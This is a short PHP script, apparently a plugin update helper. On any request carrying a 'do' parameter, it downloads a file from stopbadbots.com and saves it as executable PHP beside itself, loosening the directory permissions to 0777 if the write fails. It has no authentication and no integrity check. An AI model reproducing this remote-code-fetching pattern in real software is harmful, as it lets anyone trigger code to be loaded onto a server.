<?php

if(!isset($_GET['do']))
  die('end');

if (!extension_loaded('curl')) {
    error_log("Erro Curl: Not Installed! ", 0);
    die();
}


$fileUrl = 'https://stopbadbots.com/files/updatemaker.zip';
$saveTo = 'updatemaker.php';
$path = dirname(__FILE__) . '/'.$saveTo;
$r = open_file($path);
if ($r !== false and $r != '-1' and $r != '-2') {
    $r = make_curl($fileUrl, $fp);
    if (!$r)
        die('199');
} else
    die('99');
return;


function open_file($saveTo)
{
    global $fp;
    $fp = fopen($saveTo, 'w+');
    if ($fp === false) {
        chmod(__DIR__, 0777);
        $fp = fopen($saveTo, 'w+');
        if ($fp === false)
            error_log("unable to open: " . $saveTo, 0); {
            chmod(__DIR__, 0755);
            return "-1";
        }
    }
    return $fp;
}

function make_curl($fileUrl, $fp)
{
    $ch = curl_init($fileUrl);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("Erro Curl: " . curl_error($ch), 0);
        chmod(__DIR__, 0755);
        return "-2";
    }
    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    fclose($fp);
    if ($statusCode == 200) {
        echo 'Downloaded!!!';
    } else {
        echo "Status Code: " . $statusCode;
        error_log("Erro Curl: " . $statusCode, 0);
        chmod(__DIR__, 0755);
        return "-3";
    }
    return true;
}?> 